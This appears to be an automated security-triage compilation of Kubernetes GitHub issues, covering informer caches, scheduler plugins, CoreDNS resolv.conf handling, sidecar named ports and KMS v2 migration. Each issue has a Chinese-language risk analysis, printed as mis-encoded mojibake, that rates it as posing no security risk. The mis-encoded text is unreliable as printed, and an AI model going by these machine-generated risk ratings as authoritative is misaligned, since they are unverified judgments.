	stopCh := make(chan struct{})
	factory.Start(stopCh)
	klog.Infof("waiting for caches to sync")
	for {
		if factory.Core().V1().Pods().Informer().HasSynced() {
			klog.Infof("pod synced")
			break
		}
		time.Sleep(200 * time.Millisecond)
	}
	<-stopCh
}
```


#### Anything else we need to know?

_No response_

#### Kubernetes version

client-go v0.29.7


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
æ ¹æ®æä¾›çš„Issueå†…å®¹ï¼Œå‘ç°å½“è®¾ç½®éé›¶çš„resyncæ—¶é—´å’Œtransformå‡½æ•°æ¥ä¿®æ”¹annotationsæˆ–labelsæ—¶ï¼Œå¯èƒ½ä¼šå¯¼è‡´å¹¶å‘çš„mapè¯»å†™ï¼Œä»è€Œå¼•å‘ç¨‹åºçš„panicã€‚

è¿™ä¸ªé—®é¢˜ä¸»è¦æ˜¯ç”±äºå¼€å‘è€…åœ¨ä½¿ç”¨client-goåº“æ—¶ä¸å½“æ“ä½œå¯¼è‡´çš„å¹¶å‘è®¿é—®é”™è¯¯ï¼Œå¹¶ä¸æ˜¯é¡¹ç›®æœ¬èº«çš„å®‰å…¨æ¼æ´ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬6æ¡ï¼Œå¦‚æœIssueä¸æ¶‰åŠå®‰å…¨é—®é¢˜ï¼Œåˆ™é£é™©è¯„çº§åˆ¤æ–­ä¸ºâ€œä¸æ¶‰åŠâ€ã€‚

---

## Issue #128002 Unable to simulate the unschedulable state through plugin

- Issue é“¾æ¥ï¼š[#128002](https://github.com/kubernetes/kubernetes/issues/128002)

### Issue å†…å®¹

#### What happened?

I want to simulate the the Unschedulable state (intentationally) using plugin but unable to do

```golang
func (pl *CustomePlugin) Bind(ctx context.Context, state *framework.CycleState, pod *v1.Pod, nodeName string) *framework.Status {
	log.Printf("Simulating failure in binding for pod %s to node %s", pod.Name, nodeName)
	return framework.NewStatus(framework.Unschedulable, "Pod will remain in Pending state, no node bound")
}
```

Here is my Config
```
    plugins:
      bind:
        enabled:
          - name: CustomPlugin
        disabled:
          - name: "*"
      score:
        # Additional enabled plugins
        enabled:
          - name: CustomPlugin
        disabled:
          - name: "*"
```

When i am describing pod log, It schedule on another node here is the log

<img width="1062" alt="Screenshot 2024-10-11 at 7 32 38â€¯PM" src="https://github.com/user-attachments/assets/f1e9f579-20d7-4fa0-a599-e43e64a34459">

What I am doing wrong?


#### What did you expect to happen?

It should not schedule to any node.

#### How can we reproduce it (as minimally and precisely as possible)?

Here is my `main.go`

```golang
package main

import (
	"context"
	"fmt"
	"log"

	v1 "k8s.io/api/core/v1"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/kubernetes/cmd/kube-scheduler/app"
	"k8s.io/kubernetes/pkg/scheduler/framework"
)

const (
	PluginName = "CustomScheduler"
)

type CustomScheduler struct {
	handle framework.Handle
}

var _ framework.ScorePlugin = &CustomScheduler{}

func (pl *CustomScheduler) Name() string {
	return PluginName
}

func (pl *CustomScheduler) Score(ctx context.Context, state *framework.CycleState, pod *v1.Pod, nodeName string) (int64, *framework.Status) {
	if nodeName == "w1" || nodeName == "w2" {
		return 100, nil
	}

	return 0, nil
}

func (pl *CustomScheduler) ScoreExtensions() framework.ScoreExtensions {
	return pl
}

func (pl *CustomScheduler) Bind(ctx context.Context, state *framework.CycleState, pod *v1.Pod, nodeName string) *framework.Status {
	// Log the attempt to bind the pod and simulate failure
	log.Printf("Simulating failure in binding for pod %s to node %s", pod.Name, nodeName)

	// Return an error to keep the pod in Pending state
	return framework.NewStatus(framework.Unschedulable, "Pod will remain in Pending state, no node bound")
}

func (pl *CustomScheduler) NormalizeScore(ctx context.Context, state *framework.CycleState, pod *v1.Pod, scores framework.NodeScoreList) *framework.Status {
	fmt.Println(scores)
	return nil
}

func New(_ context.Context, _ runtime.Object, h framework.Handle) (framework.Plugin, error) {
	return &CustomScheduler{handle: h}, nil
}

func main() {
	cmd := app.NewSchedulerCommand(
		app.WithPlugin(PluginName, New),
	)

	err := cmd.Execute()
	if err != nil {
		log.Fatal(err)
	}
}
```

config.yaml
```
apiVersion: kubescheduler.config.k8s.io/v1
kind: KubeSchedulerConfiguration
clientConnection:
  kubeconfig: "/Users/bhautik/.kube/config"
profiles:
  - schedulerName: default-scheduler
    percentageOfNodesToScore: 100
    plugins:
      bind:
        enabled:
          - name: CustomScheduler
            weight: 5
        disabled:
          - name: "*"
      score:
        # Additional enabled plugins
        enabled:
          - name: CustomScheduler
        disabled:
          - name: "*"
```

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.1
Kustomize Version: v5.4.2
Server Version: v1.30.2+k3s1
```

</details>


#### Cloud provider

<details>
I am using k3s.
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
æ ¹æ®æä¾›çš„Issueå†…å®¹ï¼Œç”¨æˆ·åœ¨å°è¯•é€šè¿‡è‡ªå®šä¹‰Kubernetesè°ƒåº¦å™¨æ’ä»¶æ¥æ¨¡æ‹ŸPodå¤„äºä¸å¯è°ƒåº¦çŠ¶æ€ã€‚Issueä¸­æ¶‰åŠçš„ä»£ç å’Œé…ç½®ä¸»è¦æ˜¯å…³äºè‡ªå®šä¹‰æ’ä»¶çš„å®ç°å’Œä½¿ç”¨ï¼Œå¹¶æœªæ¶‰åŠä»»ä½•æ½œåœ¨çš„å®‰å…¨é£é™©ã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œå°¤å…¶æ˜¯æ ‡å‡†6ï¼Œå¦‚æœIssueä¸æ¶‰åŠå®‰å…¨é—®é¢˜ï¼Œåˆ™é£é™©è¯„çº§åˆ¤æ–­ä¸ºä¸æ¶‰åŠã€‚å› æ­¤ï¼Œè¯¥Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #127991 CoreDNS not filter incorrect settings in /etc/resolv.conf

- Issue é“¾æ¥ï¼š[#127991](https://github.com/kubernetes/kubernetes/issues/127991)

### Issue å†…å®¹

#### What happened?

Recently , eanbled dns cache on host itself where update /etc/resolv.conf files as below :
search xxx.yyy.com  zzz.com
nameserver 127.0.0.1
nameserver A.A.A.A 
nameserver B.B.B.B
options ends0 timeout:3 

Once core dns pod running it will copy records from host . And nameserver 127.0.0.1 copied as first nameserver where trigger issue happen. Other pods who query dns from core dns pod will stuck and not get correct ip from dns name. I tested on pure docker env as well. it can auto filter not correct setting in /etc/resolv.conf other than just copy it all. Docker can ignore nameserver 127.0.0.1 or nameserver 0.0.0.0 setting there. 

#### What did you expect to happen?

Read content and filter not correct settings in /etc/resolv.conf just as mechanism of docker  

#### How can we reproduce it (as minimally and precisely as possible)?

Just enable copy above /etc/resolv.conf and re-deployment core-dns 

#### Anything else we need to know?

_No response_

#### Kubernetes version


kubernetes version: v1.24.10



#### Cloud provider

<details>
not sure what should input here
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="Oracle Linux Server"
VERSION="8.10"
ID="ol"
ID_LIKE="fedora"
VARIANT="Server"
VARIANT_ID="server"
VERSION_ID="8.10"
PLATFORM_ID="platform:el8"
PRETTY_NAME="Oracle Linux Server 8.10"
ANSI_COLOR="0;31"
CPE_NAME="cpe:/o:oracle:linux:8:10:server"
HOME_URL="https://linux.oracle.com/"
BUG_REPORT_URL="https://github.com/oracle/oracle-linux"

ORACLE_BUGZILLA_PRODUCT="Oracle Linux 8"
ORACLE_BUGZILLA_PRODUCT_VERSION=8.10
ORACLE_SUPPORT_PRODUCT="Oracle Linux"
ORACLE_SUPPORT_PRODUCT_VERSION=8.10
$ uname -a
Linux  5.4.17-2136.333.5.el8uek.x86_64 #3 SMP Thu Jun 20 01:03:41 PDT 2024 x86_64 x86_64 x86_64 GNU/Linux




```
</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†CoreDNSåœ¨è¯»å–ä¸»æœºçš„/etc/resolv.confæ–‡ä»¶æ—¶ï¼Œæ²¡æœ‰è¿‡æ»¤ä¸æ­£ç¡®çš„é…ç½®ï¼ˆå¦‚nameserver 127.0.0.1ï¼‰ï¼Œå¯¼è‡´å…¶ä»–Podåœ¨æŸ¥è¯¢DNSæ—¶æ— æ³•æ­£ç¡®è§£æã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œè¯¥é—®é¢˜å±äºé…ç½®ä¸å½“å¯¼è‡´çš„åŠŸèƒ½æ€§é”™è¯¯ï¼Œä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚å› ä¸ºæ”»å‡»è€…æ— æ³•åˆ©ç”¨æ­¤é—®é¢˜è¿›è¡Œæ”»å‡»ï¼Œä¹Ÿæ— æ³•å¯¼è‡´ç³»ç»Ÿå­˜åœ¨å¯è¢«åˆ†é…CVEç¼–å·çš„æ¼æ´ã€‚ç»¼ä¸Šæ‰€è¿°ï¼Œé£é™©è¯„çº§ä¸ºä¸æ¶‰åŠã€‚

---

## Issue #127990 `system:monitoring` lacks access to kubelet /metrics endpoint

- Issue é“¾æ¥ï¼š[#127990](https://github.com/kubernetes/kubernetes/issues/127990)

### Issue å†…å®¹

#### What happened?

Discussion began in https://github.com/kubernetes/enhancements/pull/4830#discussion_r1794149005 where it was identified that [`system:monitoring` cluster role](https://github.com/kubernetes/kubernetes/blob/release-1.31/staging/src/k8s.io/apiserver/pkg/authentication/user/user.go#L73) does not allow access to kubelet's /metrics and /metrics/slis endpoint

#### What did you expect to happen?

Would have expected the test described [here](https://github.com/kubernetes/enhancements/pull/4830#discussion_r1794426008) to pass

#### How can we reproduce it (as minimally and precisely as possible)?

Summarized [here](https://github.com/kubernetes/enhancements/pull/4830#discussion_r1794426008)

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# v1.31.0
```

</details>


#### Cloud provider

<details>
GCP
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueè®¨è®ºäº†`system:monitoring`é›†ç¾¤è§’è‰²æ— æ³•è®¿é—®kubeletçš„/metricså’Œ/metrics/slisç«¯ç‚¹çš„é—®é¢˜ï¼Œè¿™æ˜¯ä¸€ä¸ªå…³äºæƒé™é…ç½®çš„åŠŸèƒ½æ€§é—®é¢˜ã€‚Issueæäº¤è€…å¸Œæœ›è°ƒæ•´æƒé™ä»¥å…è®¸è¯¥è§’è‰²è®¿é—®kubeletçš„æŒ‡æ ‡æ•°æ®ï¼Œè¿™æœ‰åŠ©äºç›‘æ§å’Œç®¡ç†é›†ç¾¤çš„æ€§èƒ½ã€‚è¿™ç§æƒé™ä¸è¶³çš„é—®é¢˜ä¸ä¼šå¯¼è‡´å®‰å…¨é£é™©ï¼Œä¹Ÿä¸å­˜åœ¨è¢«æ”»å‡»è€…åˆ©ç”¨çš„æ¼æ´ã€‚å› æ­¤ï¼Œæ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œè¯¥Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #127977 namespace not exists, but can get the cr resource in this namespace

- Issue é“¾æ¥ï¼š[#127977](https://github.com/kubernetes/kubernetes/issues/127977)

### Issue å†…å®¹

#### What happened?

namespace not exists, but can get the cr resource
```
k get mysqlbackup -A
NAMESPACE   NAME                  AGE
m1          backup-ms-3-1229      285d
m1          ddddddddddd           285d
m1          master-slave-1-1229   285d
```
ns m1 no exists

```
 k get ns|grep m1
```

get backup-ms-3-1229 in m1
```
k get  mysqlbackup backup-ms-3-1229 -n m1
NAME               AGE
backup-ms-3-1229   285d
```




#### What did you expect to happen?

if ns no exists, the cr resource should not get

#### How can we reproduce it (as minimally and precisely as possible)?

this resource created long time ago

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: version.Info{Major:"1", Minor:"26", GitVersion:"v1.26.10", GitCommit:"b8609d4dd75c5d6fba4a5eaa63a5507cb39a6e99", GitTreeState:"clean", BuildDate:"2023-10-18T11:44:31Z", GoVersion:"go1.20.10", Compiler:"gc", Platform:"linux/amd64"}
Kustomize Version: v4.5.7
Server Version: version.Info{Major:"1", Minor:"26", GitVersion:"v1.26.10", GitCommit:"b8609d4dd75c5d6fba4a5eaa63a5507cb39a6e99", GitTreeState:"clean", BuildDate:"2023-10-18T11:33:36Z", GoVersion:"go1.20.10", Compiler:"gc", Platform:"linux/amd64"}
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
PRETTY_NAME="Ubuntu 22.04.1 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.1 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
$ uname -a
Linux master01 5.15.0-119-generic #129-Ubuntu SMP Fri Aug 2 19:25:20 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux

```

</details>


#### Install tools

<details>
kubeadm
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
Client: Docker Engine - Community
 Version:           20.10.21
 API version:       1.41
 Go version:        go1.18.7
 Git commit:        baeda1f
 Built:             Tue Oct 25 18:01:58 2022
 OS/Arch:           linux/amd64
 Context:           default
 Experimental:      true

Server: Docker Engine - Community
 Engine:
  Version:          20.10.21
  API version:      1.41 (minimum version 1.12)
  Go version:       go1.18.7
  Git commit:       3056208
  Built:            Tue Oct 25 17:59:49 2022
  OS/Arch:          linux/amd64
  Experimental:     false
 containerd:
  Version:          1.6.9
  GitCommit:        1c90a442489720eec95342e1789ee8a5e1b9536f
 runc:
  Version:          1.1.4
  GitCommit:        v1.1.4-0-g5fd4c4d
 docker-init:
  Version:          0.19.0
  GitCommit:        de40ad0
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
CNI: kube-flannel
CSI: 
</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥IssueæŠ¥å‘Šäº†åœ¨Kubernetesé›†ç¾¤ä¸­ï¼Œä¸€ä¸ªä¸å­˜åœ¨çš„å‘½åç©ºé—´ï¼ˆm1ï¼‰ä¸‹ä»ç„¶å¯ä»¥è·å–åˆ°è‡ªå®šä¹‰èµ„æºï¼ˆCustom Resourceï¼Œmysqlbackupï¼‰ã€‚è¿™å¯èƒ½æ˜¯ç”±äºèµ„æºæœªæ­£ç¡®æ¸…ç†å¯¼è‡´çš„ç³»ç»Ÿä¸ä¸€è‡´é—®é¢˜ï¼Œæˆ–è€…æ˜¯APIæœåŠ¡å™¨ç¼“å­˜å¯¼è‡´çš„æ•°æ®æ®‹ç•™ã€‚ä½†æ­¤é—®é¢˜æœªæ¶‰åŠä»»ä½•å®‰å…¨é£é™©ã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š

1. è¯¥é£é™©èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨å—ï¼Ÿæ­¤é—®é¢˜æ˜¯ç³»ç»Ÿç®¡ç†å’Œèµ„æºæ¸…ç†é—®é¢˜ï¼Œæ”»å‡»è€…æ— æ³•åˆ©ç”¨ã€‚
2. è¯¥é£é™©æœ‰å¯èƒ½æˆä¸ºæ¼æ´å¹¶è¢«åˆ†é…CVEç¼–å·ä¸”CVSSè¯„åˆ†åœ¨highä»¥ä¸Šå—ï¼Ÿä¸å¯èƒ½ï¼Œæ­¤é—®é¢˜ä¸ä¼šå¯¼è‡´æƒé™æå‡ã€å‘½ä»¤æ‰§è¡Œç­‰é«˜é£é™©æ¼æ´ã€‚
3. Issueæäº¤è€…åœ¨æäº¤å†…å®¹ä¸­æš´éœ²çš„æ•æ„Ÿä¿¡æ¯ã€ä¸å½“æ“ä½œã€ä¸å½“é…ç½®ç­‰é—®é¢˜ï¼Œä¸å±äºå®‰å…¨é£é™©ã€‚

å› æ­¤ï¼Œé£é™©è¯„çº§åˆ¤æ–­ä¸ºâ€œä¸æ¶‰åŠâ€ã€‚

---

## Issue #127958 Named ports specified in sidecar container pod spec are not available to services

- Issue é“¾æ¥ï¼š[#127958](https://github.com/kubernetes/kubernetes/issues/127958)

### Issue å†…å®¹

#### What happened?

When migrating a sidecar container to a native sidecar container (initContainer with restartPolicy=Always), traffic going via the Kubernetes Service did not reach the application container/sidecar container.

#### What did you expect to happen?

The traffic should have reached the sidecar container like before the migration.

#### How can we reproduce it (as minimally and precisely as possible)?

Create a Pod with a native sidecar container (initContainer) with a named port, as well as a Kubernetes Service using that named port as its targetPort. This port is not listed in the Endpoint.

Apply the following:

```
apiVersion: v1
kind: Pod
metadata:
  name: sidecar-ports
  labels:
    app: sidecar-ports
spec:
  containers:
  - image: bloomberg/goldpinger:3.10.1
    name: goldpinger
    ports:
    - containerPort: 8000
      name: http
      protocol: TCP
  initContainers:
  # note: no envoy configuration is provided, the steps to reproduce involve reading other Kubernetes manifests (Endpoints)
  - image: envoyproxy/envoy:v1.73.7
    name: tls-terminator
    ports:
    - containerPort: 9443
      name: https
      protocol: TCP
---
apiVersion: v1
kind: Service
metadata:
  name: sidecar-ports
spec:
  ports:
  - name: http
    port: 80
    protocol: TCP
    targetPort: http
  - name: https
    port: 443
    protocol: TCP
    targetPort: https
  selector:
    app: sidecar-ports
  type: ClusterIP
```

The Endpoint backing the created Service "sidecar-ports" should contain two ports; "http" and "https", but it only contains "http":
```
k describe endpoints sidecar-ports
Name:         sidecar-ports
Namespace:    default
Subsets:
  Ports:
    Name  Port  Protocol
    ----  ----  --------
    http  8000  TCP

Events:  <none>
```

#### Anything else we need to know?

The feature gate is enabled:

```
kubectl get --raw /metrics | grep kubernetes_feature_enabled | grep SidecarContainers
kubernetes_feature_enabled{name="SidecarContainers",stage="BETA"} 1
```

I was suggested to create this issue in [this Slack thread](https://kubernetes.slack.com/archives/C06JCTLFPFX/p1728475764781559)

Workarounds:

1) 

If we update the Service to contain numeric ports instead of named ports, they show up in the endpoint:
```diff
k diff -f reproduce.yaml
diff -u -N /tmp/LIVE-529307225/v1.Service.default.sidecar-ports /tmp/MERGED-1321372933/v1.Service.default.sidecar-ports
--- /tmp/LIVE-529307225/v1.Service.default.sidecar-ports 2024-10-09 14:40:30.518739432 +0200
+++ /tmp/MERGED-1321372933/v1.Service.default.sidecar-ports      2024-10-09 14:40:30.518739432 +0200
@@ -25,7 +25,7 @@
   - name: https
     port: 443
     protocol: TCP
-    targetPort: https
+    targetPort: 9443
   selector:
     app: sidecar-ports
   sessionAffinity: None
```

```
Name:         sidecar-ports
Namespace:    default
Subsets:
  Ports:
    Name   Port  Protocol
    ----   ----  --------
    https  9443  TCP
    http   8000  TCP

Events:  <none>
```

2)

If we specify the named port in the "main" container instead of in the initContainer, the port shows up in the endpoint:

```diff
spec:
  containers:
  - image: bloomberg/goldpinger:3.10.1
    name: goldpinger
    ports:
    - containerPort: 8000
      name: http
      protocol: TCP
+    - containerPort: 9443
+      name: https
+      protocol: TCP
  initContainers:
  # note: no envoy configuration is provided, the steps to reproduce involve reading other Kubernetes manifests (Endpoints)
  - image: envoyproxy/envoy:v1.73.7
    name: tls-terminator
-    ports:
-    - containerPort: 9443
-      name: https
-      protocol: TCP
```

```
Name:         sidecar-ports
Namespace:    default
Subsets:
  Ports:
    Name   Port  Protocol
    ----   ----  --------
    https  9443  TCP
    http   8000  TCP

Events:  <none>
```

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.29.9
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.29.8
```

</details>


#### Cloud provider

<details>
Self-hosted, kubeadm-driven.
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
I'll say Ubuntu.
$ uname -a
I can provide this if strictly relevant.

```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>
```
$ containerd --version
containerd containerd.io 1.7.20 8fc6bcff51318944179630522a095cc9dbf9f353
```
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
åœ¨åˆ†æè¯¥Issueæ—¶ï¼Œå¯ä»¥çœ‹åˆ°ç”¨æˆ·åœ¨ä½¿ç”¨Kubernetesçš„åŸç”Ÿsidecarå®¹å™¨ï¼ˆä½œä¸ºinitContainerï¼Œè®¾ç½®`restartPolicy=Always`ï¼‰æ—¶ï¼Œå‘ç°å®šä¹‰åœ¨sidecarå®¹å™¨ä¸­çš„å‘½åç«¯å£æ— æ³•é€šè¿‡Serviceè®¿é—®ã€‚è¿™å¯¼è‡´æµé‡æ— æ³•åˆ°è¾¾åº”ç”¨ç¨‹åºå®¹å™¨æˆ–sidecarå®¹å™¨ã€‚

è¿™ä¸ªé—®é¢˜æ˜¯å…³äºKubernetesä¸­å‘½åç«¯å£åœ¨ç‰¹å®šé…ç½®ä¸‹æœªæ­£ç¡®æš´éœ²ç»™Serviceçš„åŠŸèƒ½æ€§é—®é¢˜ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š

1. **è¯¥é£é™©ä¸èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨**ã€‚è¿™ä¸ªé—®é¢˜æ˜¯ç”±äºé…ç½®å¯¼è‡´çš„æœåŠ¡ä¸å¯ç”¨ï¼Œå¹¶ä¸æ¶‰åŠæ”»å‡»è€…å¯ä»¥åˆ©ç”¨çš„å®‰å…¨æ¼æ´ã€‚

2. **è¯¥é—®é¢˜ä¸ä¼šæˆä¸ºä¸€ä¸ªæ¼æ´**ï¼Œä¹Ÿä¸ä¼šè¢«åˆ†é…CVEç¼–å·ï¼ŒæŒ‰ç…§CVSS 3.1è¯„åˆ†æ ‡å‡†ï¼Œä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

3. **Issueæäº¤è€…åœ¨æäº¤å†…å®¹ä¸­å¹¶æœªæš´éœ²æ•æ„Ÿä¿¡æ¯ã€ä¸å½“æ“ä½œæˆ–ä¸å½“é…ç½®**ï¼Œå› æ­¤ä¸å±äºå®‰å…¨é£é™©ã€‚

6. **è¯¥Issueä¸æ¶‰åŠå®‰å…¨é—®é¢˜**ï¼Œå› æ­¤é£é™©è¯„çº§åˆ¤æ–­ä¸ºâ€œä¸æ¶‰åŠâ€ã€‚

---

## Issue #127957 pyroscope-server always restarts and cannot be started successfully

- Issue é“¾æ¥ï¼š[#127957](https://github.com/kubernetes/kubernetes/issues/127957)

### Issue å†…å®¹

#### What happened?

pyroscope-server always restarts and cannot be started successfully, reporting probe 503 error, version is 1.4.0,There was no operation, it just happened suddenly, I don't know why

#### What did you expect to happen?

Started successfully and no longer restarted frequently

#### How can we reproduce it (as minimally and precisely as possible)?

The error log information is as followsï¼š
![image](https://github.com/user-attachments/assets/bc17667b-417a-40a4-bf25-75249a9b6621)

the version is pyroscope:1.4.0

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†pyroscope-serveræ— æ³•å¯åŠ¨ï¼Œæ€»æ˜¯é‡å¯å¹¶æŠ¥å‘Šprobe 503é”™è¯¯ï¼Œæ²¡æœ‰æä¾›æ›´å¤šç»†èŠ‚ã€‚ä»æä¾›çš„ä¿¡æ¯æ¥çœ‹ï¼Œè¿™ä¼¼ä¹æ˜¯ä¸€ä¸ªåº”ç”¨ç¨‹åºè‡ªèº«çš„é—®é¢˜ï¼Œå¯èƒ½ç”±äºé…ç½®é”™è¯¯æˆ–ç¨‹åºbugå¯¼è‡´çš„æ•…éšœï¼Œå¹¶æ²¡æœ‰æ¶‰åŠå®‰å…¨é£é™©ã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼ŒIssueä¸æ¶‰åŠå®‰å…¨é—®é¢˜ï¼Œé£é™©è¯„çº§åˆ¤æ–­ä¸ºä¸æ¶‰åŠã€‚

---

## Issue #127950 Unable to migrate to kms v2

- Issue é“¾æ¥ï¼š[#127950](https://github.com/kubernetes/kubernetes/issues/127950)

### Issue å†…å®¹

#### What happened?

We tried to migrate kms plugin from v1 to v2 as kms v1 is deprecated with Micork8s version v1.26 onwards.
During the migration, we were unable to create secrets using kms plugin and we are getting below errors:
```
failed to create: Internal error occurred: got unexpected nil transformer
```


#### What did you expect to happen?

The secrets should be created successfully

#### How can we reproduce it (as minimally and precisely as possible)?

1. Upgrade the kubernetes to v1.30.3
2. Migrate the KMS plugin to v2
3. Create a new secret with command:
```
kubectl create secret generic kmssecret -n default --from-literal=mykey="This a test data to encrypt"
```

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.3
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.3
```

</details>


#### Cloud provider

<details>
Microk8s On-Premise
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"
NAME="Debian GNU/Linux"
VERSION_ID="12"
VERSION="12 (bookworm)"
VERSION_CODENAME=bookworm
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"

$ uname -a
Linux kms-test 6.6.16generic #1 SMP PREEMPT_DYNAMIC Sat Jun  8 12:36:32 UTC 2024 x86_64 GNU/Linux

```

</details>


#### Install tools

<details>
Microk8s
</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨å°†KMSæ’ä»¶ä»v1è¿ç§»åˆ°v2åï¼Œåˆ›å»ºSecretæ—¶é‡åˆ°äº†é”™è¯¯ï¼š`failed to create: Internal error occurred: got unexpected nil transformer`ã€‚è¿™å¯¼è‡´æ— æ³•åˆ›å»ºSecretï¼Œå½±å“äº†æ­£å¸¸ä½¿ç”¨ã€‚

æ ¹æ®æä¾›çš„ä¿¡æ¯ï¼Œè¿™æ˜¯åœ¨å‡çº§Kubernetesç‰ˆæœ¬å’Œè¿ç§»KMSæ’ä»¶æ—¶å‡ºç°çš„å…¼å®¹æ€§æˆ–é…ç½®é—®é¢˜ã€‚æ²¡æœ‰è¿¹è±¡è¡¨æ˜æ­¤é—®é¢˜ä¼šå¯¼è‡´å®‰å…¨æ¼æ´è¢«æ”»å‡»è€…åˆ©ç”¨ï¼Œä¹Ÿæ²¡æœ‰æ¶‰åŠæ•æ„Ÿä¿¡æ¯æ³„éœ²æˆ–æƒé™æå‡ç­‰å®‰å…¨é£é™©ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œæ­¤Issueä¸æ¶‰åŠå®‰å…¨é—®é¢˜ï¼Œé£é™©è¯„çº§åˆ¤æ–­ä¸ºä¸æ¶‰åŠã€‚

---

## Issue #127938 bug: No 'time' added when server-side-applying the same yaml as a 2nd field manager

